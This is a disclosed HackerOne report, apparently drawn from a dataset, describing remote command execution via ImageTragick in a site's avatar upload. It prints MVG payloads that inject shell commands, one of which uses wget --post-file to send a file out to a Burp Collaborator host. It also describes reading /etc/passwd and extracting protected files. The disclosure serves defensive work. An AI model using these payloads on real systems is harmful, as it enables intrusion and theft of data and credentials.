---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '412021'
original_report_id: '412021'
title: Remote Command execution due to image tragick
team_handle: redact
created_at: '2018-06-20T04:16:23.000Z'
disclosed_at: '2018-09-21T10:36:26.776Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 184
tags:
- hackerone
---

# Remote Command execution due to image tragick

## Metadata

- HackerOne Report ID: 412021
- Weakness: 
- Program: redact
- Disclosed At: 2018-09-21T10:36:26.776Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

During my auditing of a profile avatar functionality I discovered that the website was affected by image tragick by using a curl request as seen below 
{F349064}
I then made a request to read etc/passwd {F349067}
I then wanted to prove maximum impact by further pivoting the rce. Due to not wanting to leave a reverse shell on your server, I opted to simply create a file in the tmp folder then save command outputs to it then exfiltrate that. Examples of the payloads would be 

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg "|whoami>>/tmp/alyssa.txt")'
pop graphic-context
```
Then we can simply exfilitrate it using wget
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg "|wget --post-file /tmp/alyssa.txt XXX.burpcollaborator.net")'
pop graphic-context
```
{F349068}
I followed this up by doing a simple ls -la 
{F349072}
I then curled a index-test.php which referenced a test file in the protected directory
{F349073}
This lead on me a goose chase down various files and looking at various referenced files which lead me to this file in the /protected/ folder.  (Side note I couldn't get Ls -la to print out the protected folder and this would be a lot easier If I used a reverse shell )
{F349074}
When I exfilitrated that file, I received this and then followed by reporting it immediately after documenting everything.
{F349079}
{F349083}

I highly recommend you rotate credentials and patch this up quickly as this was rather trivial to exploit

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
